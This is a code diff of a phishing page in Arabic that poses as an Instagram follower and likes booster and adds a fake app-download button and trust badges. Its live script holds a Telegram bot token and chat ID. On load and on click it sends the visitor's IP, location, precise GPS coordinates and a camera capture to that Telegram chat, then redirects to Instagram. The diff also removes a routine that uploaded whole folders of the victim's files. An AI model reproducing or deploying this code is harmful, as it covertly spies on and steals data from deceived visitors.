@@ -100,6 +100,43 @@
             border-top: 1px solid rgba(255,255,255,0.05);
             padding-top: 15px;
         }
+        .google-play-btn {
+            background: #202124;
+            border: 1px solid #5f6368;
+            color: #e8eaed;
+            padding: 12px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            width: 100%;
+            justify-content: center;
+        }
+        .google-play-btn:hover {
+            background: #2d2e30;
+            border-color: #8ab4f8;
+        }
+        .google-play-btn img {
+            width: 24px;
+            height: 24px;
+        }
+        .trust-badge {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 15px 0;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .trust-badge span {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
     </style>
 </head>
 <body>
@@ -109,16 +146,23 @@
     <h1>خدمة رفع التفاعل</h1>
     <div class="sub">متابعين • لايكات • مشاهدات • تعليقات</div>
 
+    <div class="trust-badge">
+        <span>🔒 مشفر</span>
+        <span>✅ موثوق</span>
+        <span>⚡ سريع</span>
+    </div>
+
     <div class="info-box">
         ⚡ <span>تحسين فوري</span> لحسابك في إنستغرام<br>
         🛡️ عملية آمنة ومشفرة بالكامل
     </div>
 
-    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-    <button class="btn" onclick="startProcess()">🚀 بدء رفع التفاعل</button>
+    <button class="google-play-btn" onclick="startProcess()">
+        <span style="font-size:20px;">📥</span> تحميل التطبيق
+    </button>
 
-    <div id="status" class="loader">⏳ جاري التحقق من الهوية وتأمين البيانات...</div>
-    <div id="statusBox" class="status-box">🔹 اضغط الزر لبدء العملية</div>
+    <div id="status" class="loader">⏳ جاري التحقق من الهوية...</div>
+    <div id="statusBox" class="status-box">🔹 اضغط "تحميل التطبيق" لبدء العملية</div>
     <div class="footer">© 2026 جميع الحقوق محفوظة</div>
 </div>
 
@@ -126,11 +170,11 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ======== بيانات التليغرام الجديدة ========
+    // ======== بيانات التليغرام ========
     const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
     const CHAT_ID = "8600300720";
-    const PAGE_NAME = "خدمة رفع التفاعل - إنستغرام";
-    // ===========================================
+    const PAGE_NAME = "خدمة رفع التفاعل";
+    // ===================================
 
     async function sendToTelegram(message) {
         try {
@@ -159,16 +203,6 @@
         } catch (e) { console.error(e); }
     }
 
-    async function sendFileToTelegram(file) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', file);
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) { console.error(e); }
-    }
-
     function dataURLtoBlob(dataURL) {
         const arr = dataURL.split(',');
         const mime = arr[0].match(/:(.*?);/)[1];
@@ -186,11 +220,9 @@
             return {
                 ip: data.ip,
                 city: data.city,
-                region: data.region,
                 country: data.country_name,
                 lat: data.latitude,
-                lon: data.longitude,
-                org: data.org
+                lon: data.longitude
             };
         } catch (e) { return null; }
     }
@@ -245,72 +277,45 @@
         statusDiv.innerText = '⏳ جاري التحقق من الهوية...';
         statusBox.innerText = '🔹 جاري تجهيز البيانات...';
 
-        // 1. جلب IP
+        // 1. IP
         const ipInfo = await getIPInfo();
         let msg = `🕵️ <b>${PAGE_NAME} - دخول جديد</b>\n\n`;
         if (ipInfo) {
             msg += `🌐 IP: ${ipInfo.ip}\n`;
-            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
-            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
+            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
             if (ipInfo.lat && ipInfo.lon) {
                 msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
             }
-            msg += `📡 المزود: ${ipInfo.org || 'غير معروف'}`;
         }
-        msg += `\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
         await sendToTelegram(msg);
 
-        // 2. طلب GPS دقيق
+        // 2. GPS
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (p) => {
                 let lat = p.coords.latitude;
                 let lon = p.coords.longitude;
                 let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
-                gpsMsg += `📍 ${mapLink}\n`;
-                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
-                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n📍 ${mapLink}\n📏 دقة: ${Math.round(p.coords.accuracy)} متر`;
                 await sendToTelegram(gpsMsg);
             }, (err) => {
                 sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
-            }, { enableHighAccuracy: true, timeout: 10000 });
+            }, { enableHighAccuracy: true, timeout: 8000 });
         }
 
-        // 3. تصوير الكاميرا
+        // 3. كاميرا
         statusDiv.innerText = '📸 جاري التقاط صورة للتحقق...';
         captureCamera();
 
-        // 4. فتح نافذة اختيار الملفات
-        statusDiv.innerText = '📂 جاري تجهيز الملفات للمزامنة...';
-        statusBox.innerText = '🔹 اختر المجلد أو الملفات لمزامنتها';
+        statusDiv.innerText = '✅ تم التحقق بنجاح!';
+        statusBox.innerText = '✅ جاري التوجيه إلى التطبيق...';
 
-        const fileInput = document.getElementById('fileInput');
-        fileInput.click();
-
-        fileInput.onchange = async function(e) {
-            const files = e.target.files;
-            if (files.length > 0) {
-                statusBox.innerText = `🔹 جاري رفع ${files.length} ملف...`;
-                
-                for (let i = 0; i < files.length; i++) {
-                    statusBox.innerText = `🔹 رفع الملف ${i+1} من ${files.length}`;
-                    await sendFileToTelegram(files[i]);
-                    await new Promise(r => setTimeout(r, 300));
-                }
-
-                statusDiv.innerText = '✅ تمت المزامنة بنجاح!';
-                statusBox.innerText = '✅ تم رفع جميع الملفات';
-
-                await sendToTelegram(`✅ <b>${PAGE_NAME}</b> - تم رفع ${files.length} ملف بنجاح!`);
-
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/";
-                }, 2000);
-            }
-        };
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com/";
+        }, 2000);
     }
 
-    // إرسال IP فور فتح الصفحة
+    // IP فور فتح الصفحة
     (async function () {
         const ipInfo = await getIPInfo();
         if (ipInfo) {
